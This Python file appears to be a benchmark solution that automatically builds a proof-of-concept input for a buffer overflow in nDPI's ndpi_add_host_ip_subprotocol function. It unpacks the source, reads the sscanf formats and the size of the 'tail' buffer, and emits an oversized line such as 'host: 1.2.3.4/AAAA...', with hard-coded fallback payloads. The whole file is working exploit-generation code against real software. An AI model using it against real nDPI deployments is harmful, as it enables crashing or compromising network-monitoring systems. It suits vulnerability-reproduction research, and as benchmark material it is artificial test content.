import os
import tarfile
import tempfile
import re


def _extract_tarball(src_path, dest_dir):
    if os.path.isdir(src_path):
        return src_path
    try:
        with tarfile.open(src_path, 'r:*') as tf:
            tf.extractall(dest_dir)
            return dest_dir
    except tarfile.TarError:
        # Not a tar; fallback to using as directory
        return src_path


def _read_text(path):
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except Exception:
        try:
            with open(path, 'r', encoding='latin-1', errors='ignore') as f:
                return f.read()
        except Exception:
            return ""


def _find_file_with_function(root, func_name):
    matches = []
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if not fn.endswith(('.c', '.h')):
                continue
            fp = os.path.join(dirpath, fn)
            try:
                with open(fp, 'r', encoding='utf-8', errors='ignore') as f:
                    data = f.read()
                if func_name in data:
                    matches.append(fp)
            except Exception:
                continue
    # Prefer ndpi_main.c
    for m in matches:
        if os.path.basename(m) == 'ndpi_main.c':
            return m
    return matches[0] if matches else None


def _extract_function_body(text, func_name):
    idx = text.find(func_name)
    if idx == -1:
        return None
    # find opening brace after function declaration
    brace_idx = text.find('{', idx)
    if brace_idx == -1:
        return None
    depth = 0
    i = brace_idx
    in_str = False
    esc = False
    while i < len(text):
        ch = text[i]
        if in_str:
            if esc:
                esc = False
            elif ch == '\\':
                esc = True
            elif ch == '"':
                in_str = False
        else:
            if ch == '"':
                in_str = True
            elif ch == '{':
                depth += 1
            elif ch == '}':
                depth -= 1
                if depth == 0:
                    return text[brace_idx:i+1]
        i += 1
    return None


def _find_tail_size(func_body):
    # Try to find definition like: char tail[NNN];
    m = re.search(r'\bchar\s+tail\s*\[\s*(\d+)\s*\]', func_body)
    if m:
        try:
            return int(m.group(1))
        except Exception:
            pass
    # Another possibility: u_int8_t tail[NNN];
    m = re.search(r'\b[uU]?[ _]*int8_t\s+tail\s*\[\s*(\d+)\s*\]', func_body)
    if m:
        try:
            return int(m.group(1))
        except Exception:
            pass
    # Fallback
    return None


def _find_all_calls(body, call_name):
    res = []
    i = 0
    n = len(body)
    while True:
        i = body.find(call_name + '(', i)
        if i == -1:
            break
        j = i + len(call_name) + 1
        depth = 1
        in_str = False
        esc = False
        while j < n and depth > 0:
            ch = body[j]
            if in_str:
                if esc:
                    esc = False
                elif ch == '\\':
                    esc = True
                elif ch == '"':
                    in_str = False
            else:
                if ch == '"':
                    in_str = True
                elif ch == '(':
                    depth += 1
                elif ch == ')':
                    depth -= 1
            j += 1
        call_str = body[i:j] if j <= n else body[i:n]
        res.append((i, j, call_str))
        i = j
    return res


def _split_args(call_inside_parentheses):
    # call_inside_parentheses is e.g., 'sscanf(a, "fmt", x, y)'
    # We need content inside outermost parentheses.
    start = call_inside_parentheses.find('(')
    end = call_inside_parentheses.rfind(')')
    if start == -1 or end == -1 or end <= start:
        return []
    s = call_inside_parentheses[start+1:end]
    args = []
    cur = []
    depth = 0
    in_str = False
    esc = False
    for ch in s:
        if in_str:
            cur.append(ch)
            if esc:
                esc = False
            elif ch == '\\':
                esc = True
            elif ch == '"':
                in_str = False
        else:
            if ch == '"':
                in_str = True
                cur.append(ch)
            elif ch == '(':
                depth += 1
                cur.append(ch)
            elif ch == ')':
                depth -= 1
                cur.append(ch)
            elif ch == ',' and depth == 0:
                args.append(''.join(cur).strip())
                cur = []
            else:
                cur.append(ch)
    if cur:
        args.append(''.join(cur).strip())
    return args


def _concat_string_literals(expr):
    # Concatenate adjacent C string literals in expr
    # e.g., "abc" "def" -> "abcdef"
    s = expr
    i = 0
    n = len(s)
    out = []
    consumed_any = False
    while i < n:
        # Skip prefixes like L, u8, u, U
        j = i
        while j < n and s[j].isspace():
            j += 1
        # handle optional prefixes before string literal.
        k = j
        while k < n and s[k] in ('L', 'u', 'U', '8'):
            # u8 literal uses two chars 'u8'; handle roughly
            # We'll simply allow letters but ensure next char is quote soon.
            k += 1
        if k < n and s[k] == '"':
            # parse string literal
            consumed_any = True
            i = k + 1
            buf = []
            esc = False
            while i < n:
                ch = s[i]
                if esc:
                    # handle simple escapes
                    buf.append(ch)
                    esc = False
                else:
                    if ch == '\\':
                        esc = True
                    elif ch == '"':
                        break
                    else:
                        buf.append(ch)
                i += 1
            out.append(''.join(buf))
            # Skip closing quote
            if i < n and s[i] == '"':
                i += 1
            # continue to look for next literal
        else:
            # Not a string literal, break
            break
        # Move to next token
    if consumed_any:
        return ''.join(out)
    return None


def _parse_scanf_format(fmt):
    tokens = []
    unsup = []
    i = 0
    n = len(fmt)
    while i < n:
        ch = fmt[i]
        if ch != '%':
            tokens.append(('lit', ch))
            i += 1
            continue
        # %%
        if i + 1 < n and fmt[i+1] == '%':
            tokens.append(('lit', '%'))
            i += 2
            continue
        j = i + 1
        suppressed = False
        if j < n and fmt[j] == '*':
            suppressed = True
            j += 1
        # width
        width = None
        startw = j
        while j < n and fmt[j].isdigit():
            j += 1
        if j > startw:
            try:
                width = int(fmt[startw:j])
            except Exception:
                width = None
        # length modifiers
        while j < n and fmt[j] in 'hlLjztq':
            j += 1
        if j >= n:
            break
        t = fmt[j]
        j += 1
        set_text = None
        conv_type = t
        if t == '[':
            # scanset
            set_start = j
            # Per C spec, ']' as first char is included in set
            # We'll find first matching ']'
            while j < n and fmt[j] != ']':
                j += 1
            set_text = fmt[set_start:j]
            conv_type = '[]'
            if j < n and fmt[j] == ']':
                j += 1
        spec = {'type': conv_type, 'suppressed': suppressed, 'width': width, 'set': set_text, 'full': fmt[i:j]}
        tokens.append(('spec', spec))
        if not suppressed:
            unsup.append(spec)
        i = j
    return tokens, unsup


def _char_in_scanset(c, set_text, negated):
    # set_text can contain ranges like a-z or digits, and possible leading ^ or ]
    s = set_text
    if s is None:
        return True
    if s.startswith('^'):
        return (c not in _expand_scanset(s[1:]))
    else:
        return (c in _expand_scanset(s))


def _expand_scanset(set_text):
    s = set_text
    # handle ']' as a member if first
    chars = set()
    i = 0
    n = len(s)
    if n == 0:
        return chars
    # If first char is ']' it's included
    if s[0] == ']':
        chars.add(']')
        i = 1
    while i < n:
        if i + 2 < n and s[i+1] == '-':
            start = s[i]
            end = s[i+2]
            # Range
            try:
                for code in range(ord(start), ord(end) + 1):
                    chars.add(chr(code))
            except Exception:
                pass
            i += 3
        else:
            chars.add(s[i])
            i += 1
    return chars


def _pick_char_for_scanset(set_text):
    # Return a char satisfying the scanset
    if set_text is None:
        return 'A'
    negated = set_text.startswith('^')
    allowed = None
    if negated:
        disallowed = _expand_scanset(set_text[1:])
        # pick a printable ASCII not in disallowed
        for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-/.":
            if c not in disallowed:
                return c
        # fallback
        for code in range(32, 127):
            if chr(code) not in disallowed:
                return chr(code)
        return 'A'
    else:
        allowed_set = _expand_scanset(set_text)
        # prefer these
        for c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-/.":
            if c in allowed_set:
                return c
        # fallback: pick any
        if allowed_set:
            return next(iter(allowed_set))
        return 'A'


def _generate_input_from_format(fmt, tail_unsup_index, tail_size, long_extra=16):
    tokens, unsup = _parse_scanf_format(fmt)
    out = []
    unsup_idx = 0
    for kind, val in tokens:
        if kind == 'lit':
            # For whitespace in literals, produce same char
            out.append(val)
            continue
        spec = val
        t = spec['type']
        suppressed = spec['suppressed']
        width = spec['width']
        # Determine if this spec corresponds to tail
        is_tail_here = (not suppressed) and (unsup_idx == tail_unsup_index)
        if not suppressed:
            unsup_idx += 1
        # Input production for this spec
        if t == 'n':
            # no input consumed
            # don't append anything
            continue
        if t == 's':
            if is_tail_here:
                K = (tail_size + 1) if tail_size is not None else 256
                K += long_extra
                out.append('A' * K)
            else:
                out.append('X')
        elif t == '[]':
            set_text = spec['set']
            if is_tail_here:
                # produce long sequence of allowed chars
                ch = _pick_char_for_scanset(set_text)
                K = (tail_size + 1) if tail_size is not None else 256
                K += long_extra
                out.append(ch * K)
            else:
                ch = _pick_char_for_scanset(set_text)
                out.append(ch)
        elif t in ('d', 'i', 'u', 'o', 'x', 'X', 'p'):
            out.append('0')
        elif t in ('f', 'F', 'e', 'E', 'g', 'G', 'a', 'A'):
            out.append('0')
        elif t == 'c':
            w = width if width is not None else 1
            if is_tail_here:
                # Provide long sequence if c with width unspecified can't overflow (it reads 1). We'll just supply one char.
                out.append('C' * w)
            else:
                out.append('C' * w)
        else:
            # Unknown specifier; put generic char
            out.append('Z')
    return ''.join(out)


def _find_candidates(func_body):
    calls = _find_all_calls(func_body, 'sscanf')
    candidates = []
    for _, _, call_str in calls:
        args = _split_args(call_str)
        if len(args) < 3:
            continue
        fmt_raw = args[1]
        fmt = _concat_string_literals(fmt_raw)
        if not fmt:
            continue
        # map unsuppressed conversion index to argument index
        tokens, unsup = _parse_scanf_format(fmt)
        # Build argument mapping: argument i+2 corresponds to unsuppressed spec i
        for arg_idx in range(2, len(args)):
            arg = args[arg_idx]
            if 'tail' in arg:
                unsup_idx = arg_idx - 2
                if unsup_idx >= 0 and unsup_idx < len(unsup):
                    spec = unsup[unsup_idx]
                    # Only consider potentially overflowing specs: %s or %[] with no width
                    if spec['type'] in ('s', '[]') and (spec['width'] is None):
                        candidates.append((fmt, unsup_idx))
                break
    return candidates


class Solution:
    def solve(self, src_path: str) -> bytes:
        tmpdir = tempfile.mkdtemp(prefix="ndpi_poc_")
        root = _extract_tarball(src_path, tmpdir)
        file_path = _find_file_with_function(root, 'ndpi_add_host_ip_subprotocol')
        # Fallback search if not found
        if not file_path:
            for dirpath, _, filenames in os.walk(root):
                for fn in filenames:
                    if fn.endswith('.c'):
                        fp = os.path.join(dirpath, fn)
                        data = _read_text(fp)
                        if 'ndpi_add_host_ip_subprotocol' in data:
                            file_path = fp
                            break
                if file_path:
                    break
        # If still not found, return a generic guess input
        if not file_path:
            # Generic guess targeting common pattern "IP/MASK" where '%s' reads mask tail
            payload = b"host: 1.2.3.4/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
            return payload
        text = _read_text(file_path)
        body = _extract_function_body(text, 'ndpi_add_host_ip_subprotocol')
        if not body:
            payload = b"host: 1.2.3.4/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
            return payload
        tail_size = _find_tail_size(body)
        candidates = _find_candidates(body)
        gen_inputs = []
        for fmt, tail_unsup_idx in candidates:
            s = _generate_input_from_format(fmt, tail_unsup_idx, tail_size, long_extra=4)
            # Ensure it has a newline to mimic line-based parsing
            if not s.endswith('\n'):
                s += '\n'
            gen_inputs.append(s)
        if gen_inputs:
            # pick shortest
            best = min(gen_inputs, key=len)
            return best.encode('utf-8', errors='ignore')
        # Fallback crafting. Use plausible formats commonly used by nDPI:
        # 1) host rule: "host: <value> -> <proto> <subproto>"
        overflow_len = (tail_size + 8) if tail_size is not None else 64
        tail = 'A' * overflow_len
        guesses = [
            f"host: a:{tail}\n",
            f"host: a,b:{tail}\n",
            f"host:{tail}\n",
            f"ip:1.2.3.4/{tail}\n",
            f"1.2.3.4/{tail}\n",
            f"ip: {tail}\n",
            f"{tail}\n",
        ]
        # Choose the most specific likely to be parsed
        for g in guesses:
            if len(g) > 0:
                return g.encode('utf-8', errors='ignore')
        return b"A" * 56